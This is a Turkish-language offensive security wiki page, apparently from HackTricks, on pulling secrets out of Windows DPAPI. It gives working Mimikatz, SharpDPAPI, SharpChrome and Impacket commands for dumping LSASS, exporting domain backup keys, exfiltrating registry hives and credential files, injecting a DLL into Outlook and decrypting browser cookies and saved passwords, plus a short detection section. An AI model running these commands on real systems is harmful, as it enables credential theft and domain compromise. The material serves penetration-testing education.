# DPAPI - Parolaları Çıkarma

{{#include ../../banners/hacktricks-training.md}}



## DPAPI nedir

Data Protection API (DPAPI), Windows işletim sistemi içinde esas olarak **asimetrik private key'lerin symmetric encryption işlemi** için kullanılır ve önemli bir entropy kaynağı olarak kullanıcı veya sistem secret'larından yararlanır. Bu yaklaşım, geliştiricilerin verileri kullanıcının logon secret'larından türetilen bir key ile veya system encryption için sistemin domain authentication secret'larıyla encrypt etmesine olanak tanıyarak encryption key'in korunmasını kendilerinin yönetme gereksinimini ortadan kaldırır.

DPAPI'yi kullanmanın en yaygın yolu, uygulamaların o anda logon olmuş process'in security context'ini kullanarak verileri encrypt ve decrypt etmesini sağlayan **`CryptProtectData` ve `CryptUnprotectData`** function'larıdır. Varsayılan olarak veriler yalnızca onları encrypt eden aynı user veya system context tarafından decrypt edilebilir.<sup>[[2]](#references)[[3]](#references)</sup>

Bu function'lar ayrıca encryption ve decryption sırasında kullanılan isteğe bağlı bir **entropy parameter** kabul eder. İsteğe bağlı entropy ile korunan verilerin decrypt edilebilmesi için aynı entropy value gerekir.<sup>[[2]](#references)[[6]](#references)</sup>

### User key generation

DPAPI, user credentials bilgilerinden user'a özel bir value (genellikle **pre-key** olarak adlandırılır) türetir. Türetme işlemi account'a ve operating-system version'a bağlıdır. Örneğin Impacket, password'un SHA-1 digest'ini temel alan bir HMAC-SHA1 path, password'un MD4/NT hash'ini temel alan başka bir path ve Protected Users için PBKDF2-SHA256-derived bir path dener. Bu nedenle offline tooling, gerekli material'ı plaintext password veya mevcut bir NT hash üzerinden sıklıkla türetebilir.<sup>[[2]](#references)[[10]](#references)</sup>

Bu özellikle önemlidir; çünkü bir attacker user'ın password hash'ini elde edebilirse şunları yapabilir:

- O user'ın key'i kullanılarak **DPAPI ile encrypt edilmiş tüm verileri**, herhangi bir API'ye erişmesi gerekmeden **decrypt edebilir**
- Geçerli DPAPI key'ini oluşturmaya çalışarak **password'ü offline crack etmeyi** deneyebilir

DPAPI, her protected blob için yeni bir master key oluşturmak yerine her user için bir veya daha fazla **master key** tutar. Her master key'in bir **GUID**'si (Globally Unique Identifier) vardır ve encrypt edilmiş bir blob, kendisini hangi master key'in koruduğunu kaydeder.<sup>[[2]](#references)</sup>

Master key'ler, `{SID}` değerinin user'ın Security Identifier'ı olduğu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory'sinde saklanır. Master-key file'ı, user'ın **pre-key**'i tarafından korunan material'ı ve domain user'ları için bir **domain backup key** tarafından korunan recovery material'ını içerir.<sup>[[2]](#references)</sup>

Master key'i encrypt etmek için kullanılan **domain key**'in domain controller'larda bulunduğunu ve hiç değişmediğini unutmayın; bu nedenle bir attacker domain controller'a erişebiliyorsa domain backup key'ini alabilir ve domain'deki tüm user'ların master key'lerini decrypt edebilir.<sup>[[2]](#references)</sup>

Encrypt edilmiş blob'lar, header'ları içinde verileri encrypt etmek için kullanılan **master key'in GUID**'sini içerir.

> [!TIP]
> DPAPI ile encrypt edilmiş blob'lar **`01 00 00 00`** ile başlar

Master key'leri bulun:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bu, bir kullanıcının bir grup Master Keys anahtarının nasıl görüneceğidir:

![DPAPI nedir - Kullanıcı anahtarı oluşturma: Bu, bir kullanıcının bir grup Master Keys anahtarının nasıl görüneceğidir](<../../images/image (1121).png>)

### Machine/System key generation

Bu anahtar, makinenin verileri şifrelemesi için kullanılır. Yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtar olan **DPAPI_SYSTEM LSA secret** temel alınarak oluşturulur. Bu anahtar; makine düzeyindeki kimlik bilgileri veya sistem genelindeki secrets gibi sistemin kendisi tarafından erişilmesi gereken verileri şifrelemek için kullanılır.<sup>[[2]](#references)</sup>

Bu anahtarların **domain backup'ı olmadığını** ve bu nedenle yalnızca yerel olarak erişilebilir olduğunu unutmayın:

- **Mimikatz**, `mimikatz lsadump::secrets` komutunu kullanarak LSA secrets'ı dump edip bu anahtara erişebilir.
- Secret registry içinde saklanır; bu nedenle bir administrator **erişmek için DACL permissions'ı değiştirebilir**. Registry path: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hive'larından offline extraction da mümkündür. Örneğin hedef üzerinde administrator olarak hive'ları kaydedip exfiltrate edin:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Ardından analiz makinenizde hives içinden DPAPI_SYSTEM LSA secret'ını kurtarın ve bunu machine-scope blob'larını (scheduled task password'leri, service credential'ları, Wi‑Fi profile'ları vb.) decrypt etmek için kullanın:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI Tarafından Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

- Windows creds
- Internet Explorer ve Google Chrome parolaları ile otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesabı parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve şifreleme anahtarları dahil Windows Vault parolaları
- Uzak masaüstü bağlantıları ve .NET Passport parolaları ile çeşitli şifreleme ve kimlik doğrulama amaçlarına yönelik private key'ler
- Credential Manager tarafından yönetilen network parolaları ve Skype, MSN messenger gibi CryptProtectData kullanan uygulamalardaki kişisel veriler
- Registry içindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wi-Fi parolaları
- Scheduled task parolaları
- ...

### Master key çıkarma seçenekleri

- Kullanıcının domain admin ayrıcalıkları varsa, domain içindeki tüm kullanıcı master key'lerini decrypt etmek için **domain backup key**'e erişebilirler:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici ayrıcalıklarıyla, **LSASS belleğine erişerek** bağlı tüm kullanıcıların DPAPI ana anahtarlarını ve SYSTEM anahtarını çıkarmak mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Kullanıcının local admin privileges yetkileri varsa, machine master keys'i decrypt etmek için **DPAPI_SYSTEM LSA secret** öğesine erişebilir:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Kullanıcının parolası veya NTLM hash'i biliniyorsa, **kullanıcının master key'lerini doğrudan decrypt edebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Kullanıcı olarak bir session içindeyseniz, **master key'leri RPC kullanarak decrypt etmek için backup key'i DC'den istemek** mümkündür. Yerel admin iseniz ve kullanıcı oturum açmışsa, bunun için **oturum token'ını çalabilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ları Listeleme
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifreli Verilere Erişim

### DPAPI Şifreli Verileri Bulma

Yaygın olarak korunan kullanıcı **dosyaları** şuralardadır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Yukarıdaki yollarda `\Roaming\` ifadesini `\Local\` ile değiştirerek de kontrol edin.

Enumeration örnekleri:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI), dosya sistemindeki, registry'deki ve B64 blob'larındaki DPAPI şifreli blob'larını bulabilir:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
SharpChrome’un (aynı repo’dan) cookies gibi DPAPI hassas verilerini decrypt etmek için kullanılabileceğini unutmayın.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron hızlı tarifleri (SharpChrome)

- Mevcut user, kayıtlı logins/cookies için etkileşimli decryption (user context’inde çalıştırıldığında, ek key kullanıcının Credential Manager’ından çözümlendiği için Chrome 127+ app-bound cookies ile bile çalışır):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Yalnızca dosyalara sahip olduğunuzda Offline analysis. Önce profilin "Local State" dosyasından AES state key'i extract edin ve ardından cookie DB'sini decrypt etmek için kullanın:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK)'e ve hedef host üzerinde admin yetkisine sahip olduğunuzda domain-wide/remote triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Bir kullanıcının DPAPI prekey/credkey bilgisine (LSASS'ten) sahipseniz, password cracking işlemini atlayıp profil verilerinin şifresini doğrudan çözebilirsiniz:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notlar
- Daha yeni Chrome/Edge build'leri belirli cookie'leri "App-Bound" encryption kullanarak depolayabilir. Bu belirli cookie'lerin offline decryption işlemi, ek app-bound key olmadan mümkün değildir; bu anahtarı otomatik olarak almak için SharpChrome'u hedef kullanıcının context'i altında çalıştırın. Aşağıda referans verilen Chrome security blog postuna bakın.<sup>[[5]](#references)</sup>

### Erişim anahtarları ve veriler

- **SharpDPAPI kullanarak** mevcut session'daki DPAPI encrypted file'lardan credential'ları alın:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Şifrelenmiş veri ve guidMasterKey gibi kimlik bilgilerini alın.**<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC kullanarak **domain backup key** talep eden bir kullanıcının masterkey'inin şifresini çözün:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** aracı, masterkey şifre çözme için şu bağımsız değişkenleri de destekler (`/rpc` kullanarak domains backup key'i almanın, `/password` ile düz metin parola kullanmanın veya bir DPAPI domain private key dosyası belirtmek için `/pvk` kullanmanın mümkün olduğuna dikkat edin...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Bir masterkey kullanarak verilerin şifresini çözme**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** aracı, `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme işlemleri için şu argümanları da destekler (`/rpc` kullanılarak domain backup key alınabildiğine, `/password` ile plaintext password kullanılabildiğine, `/pvk` ile bir DPAPI domain private key dosyası belirtilebildiğine, `/unprotect` ile mevcut kullanıcı oturumunun kullanılabildiğine dikkat edin...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey'i doğrudan kullanma (parola gerekmez)

LSASS'ı dump edebiliyorsanız, Mimikatz genellikle kullanıcının masterkey'lerini plaintext parolayı bilmeden decrypt etmek için kullanılabilecek logon başına bir DPAPI key açığa çıkarır. Bu değeri doğrudan tooling'e geçirin:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çözün:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py ile Offline decryption

Victim user’ın SID’sine ve password’üne (veya NT hash’ine) sahipseniz, Impacket’ın dpapi.py aracını kullanarak DPAPI masterkey’lerini ve Credential Manager blob’larını tamamen offline olarak decrypt edebilirsiniz.<sup>[[10]](#references)[[11]](#references)</sup>

- Disk üzerindeki artefact’ları identify edin:
- Credential Manager blob(lar)ı: %APPDATA%\Microsoft\Credentials\<hex>
- Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- File transfer tooling güvenilir çalışmıyorsa, dosyaları host üzerinde base64’e çevirip çıktıyı kopyalayın:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Kullanıcının SID'si ve parolası/hash'i ile masterkey'in şifresini çözün:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Şifresi çözülmüş masterkey'i kullanarak credential blob'un şifresini çözün:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Bu iş akışı, Windows Credential Manager kullanarak kimlik bilgilerini kaydeden uygulamalar tarafından saklanan domain credentials bilgilerini (ör. `*_adm`) ve yönetici hesaplarını sıklıkla kurtarır.

---

### İsteğe Bağlı Entropy İşleme ("Third-party entropy")

Bazı uygulamalar `CryptProtectData` işlevine ek bir **entropy** değeri gönderir. Bu değer olmadan, doğru masterkey bilinse bile blob'un şifresi çözülemez. Bu nedenle, bu şekilde korunan kimlik bilgilerini hedeflerken entropy'yi elde etmek zorunludur (ör. Microsoft Outlook ve bazı VPN client'ları).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022), hedef process içindeki DPAPI işlevlerine hook ekleyen ve sağlanan tüm isteğe bağlı entropy değerlerini şeffaf biçimde kaydeden user-mode bir DLL'dir. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi process'lere karşı **DLL-injection** modunda çalıştırmak, her entropy buffer'ını çağıran process ve blob ile eşleyen bir dosya çıktısı oluşturur. Yakalanan entropy daha sonra verilerin şifresini çözmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) aracına sağlanabilir.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Masterkey'leri offline olarak cracking (Hashcat ve DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile birlikte **context 3** masterkey formatını kullanıma sundu. `hashcat` v6.2.6 (Aralık 2023), masterkey dosyasından doğrudan kullanıcı parolalarının GPU hızlandırmalı cracking işlemini sağlayan **22100** (DPAPI masterkey v1 context ), **22101** (context 1) ve **22102** (context 3) hash-mode'larını ekledi. Bu sayede saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) bu süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential ve Vault blob'larını ayrıştırabilir, bunları kırılmış anahtarlarla decrypt edebilir ve cleartext parolaları dışa aktarabilir.<sup>[[8]](#references)</sup>


### Diğer makine verilerine erişim

**SharpDPAPI ve SharpChrome** araçlarında uzak bir makinenin verilerine erişmek için **`/server:HOST`** seçeneğini belirtebilirsiniz. Elbette bu makineye erişebilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key'in bilindiği** varsayılmıştır:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP directory içindeki tüm users ve computers öğelerinin extraction işlemini ve domain controller backup key öğesinin RPC üzerinden extraction işlemini otomatikleştiren bir tooldur. Script daha sonra tüm computers IP address öğelerini çözer ve tüm users öğelerinin DPAPI blob öğelerini almak için tüm computers üzerinde smbclient çalıştırır; ardından domain backup key ile her şeyin decryption işlemini gerçekleştirir.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'ten extract edilen computers listesiyle, bunları önceden bilmiyor olsanız bile her sub network'ü bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan secrets öğelerini otomatik olarak dump edebilir. 2.x sürümü şunları tanıttı:<sup>[[9]](#references)</sup>

* Hundreds of hosts üzerinden blob öğelerinin parallel collection işlemi
* **context 3** masterkeys öğelerinin parsing işlemi ve automatic Hashcat cracking integration
* Chrome "App-Bound" encrypted cookies desteği (sonraki bölüme bakın)
* Endpoint'leri tekrarlı olarak poll etmek ve yeni oluşturulan blob öğelerini diff etmek için yeni bir **`--snapshot`** modu

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop), masterkey/credential/vault files için Hashcat/JtR formatlarında output üretebilen ve isteğe bağlı olarak cracking işlemini otomatik şekilde başlatabilen bir C# parser'ıdır. Windows 11 24H1'e kadar machine ve user masterkey formatlarını tamamen destekler.<sup>[[8]](#references)</sup>


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve DPAPI ile ilgili diğer directory'lerdeki files öğelerine erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir network share üzerinden.
- LSASS memory öğelerine erişmek veya masterkeys dump etmek için **Mimikatz**, **SharpDPAPI** veya benzer tooling kullanımı.
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** object'ine erişimle korelasyon kurulabilir.
- Bir process *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiğinde Event **4673/4674**

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Network access sahibi bir attacker, bir domain member'ı malicious bir DPAPI backup key almak üzere kandırabilir ve böylece user masterkeys öğelerinin decryption işlemini mümkün kılabilirdi. November 2023 cumulative update ile patch'lendi – administrators, DC'lerin ve workstations öğelerinin tamamen patch'lendiğinden emin olmalıdır.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (July 2024), legacy DPAPI-only protection'ın yerine user'ın **Credential Manager** altında saklanan ek bir key getirdi. Cookies öğelerinin offline decryption işlemi artık hem DPAPI masterkey hem de **GCM-wrapped app-bound key** gerektirir. SharpChrome v2.3 ve DonPAPI 2.x, user context ile çalışırken ek key'i recover edebilir.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID'den türetilen Custom Entropy

Zscaler Client Connector, `C:\ProgramData\Zscaler` altında çeşitli configuration files saklar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her file **DPAPI (Machine scope)** ile encrypted durumdadır; ancak vendor, disk üzerinde saklanmak yerine *runtime'da hesaplanan* **custom entropy** sağlar.<sup>[[1]](#references)</sup>

Entropy iki elementten yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülmüş hard-coded bir secret.
2. Configuration'ın ait olduğu Windows account'un **SID** öğesi.

DLL tarafından implement edilen algorithm şuna eşdeğerdir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Secret diskten okunabilen bir DLL içine gömülü olduğundan, **SYSTEM haklarına sahip herhangi bir yerel saldırgan herhangi bir SID için entropy'yi yeniden oluşturabilir** ve blob'ların şifresini offline olarak çözebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Şifre çözme işlemi, her **device posture check** ve beklenen değeri dahil olmak üzere eksiksiz JSON yapılandırmasını ortaya çıkarır. Bu bilgiler, client-side bypass girişimlerinde son derece değerlidir.

> TIP: diğer şifrelenmiş artefact'lar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy** olmadan (`16` sıfır byte) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan şifreleri çözülebilir.

## References

- [1] [Synacktiv – zero trust'ınıza güvenmeli misiniz? Zscaler posture check'lerini bypass etme](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI'de güvenlik analizi ve veri kurtarma](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [DPAPI ile Şifrelenmiş Secret'ları Mimikatz ve C++ ile Okuma](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows'ta Chrome cookie'lerinin güvenliğini iyileştirme](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy'sinin basit şekilde çıkarılması](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 sürüm notları](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking ve DC admin'e DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Kullanım ve seçenekler](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
